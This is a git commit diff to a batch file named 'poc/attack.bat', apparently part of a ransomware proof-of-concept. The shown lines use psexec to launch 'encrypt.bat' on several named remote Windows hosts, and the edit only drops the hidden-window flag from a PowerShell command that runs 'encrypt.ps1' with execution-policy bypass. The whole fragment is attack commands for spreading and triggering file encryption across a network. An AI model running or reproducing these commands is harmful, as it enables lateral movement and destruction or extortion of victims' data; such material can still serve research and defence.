7185c0d0d875b87c872b9ea77b6c63c2e165b337
Paulo C. Marcon <pcmarcon@gmail.com>
2021-09-06 10:47:30 -0700

    Update attack.bat

--- poc/attack.bat
+++ poc/attack.bat
@@ -5,4 +5,4 @@ start psexec \\w02.local c:\temp\encrypt.bat
 start psexec \\w03.local c:\temp\encrypt.bat
 start psexec \\w04.local c:\temp\encrypt.bat
 start psexec \\w05.local c:\temp\encrypt.bat
-powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "./encrypt.ps1 yes"
+powershell.exe -executionpolicy bypass -noprofile "./encrypt.ps1 yes"
